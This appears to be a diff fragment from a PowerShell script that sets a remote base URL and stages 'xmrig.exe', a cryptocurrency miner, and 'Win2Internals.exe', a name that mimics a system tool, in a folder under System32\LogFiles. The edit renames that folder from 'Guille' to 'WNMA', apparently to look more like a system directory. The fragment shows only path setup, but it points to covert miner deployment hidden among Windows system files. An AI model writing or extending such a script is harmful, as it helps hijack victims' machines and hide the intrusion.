@@ -18,7 +18,7 @@ $baseURL = "https://baa4ts.is-a-good.dev"
 # Definir rutas
 $root = Join-Path $env:WINDIR "System32"
 $root = Join-Path $root "LogFiles"
-$root = Join-Path $root "Guille"
+$root = Join-Path $root "WNMA"
 
 $xmrig = Join-Path $root "xmrig.exe"
 $Win2 = Join-Path $root "Win2Internals.exe"
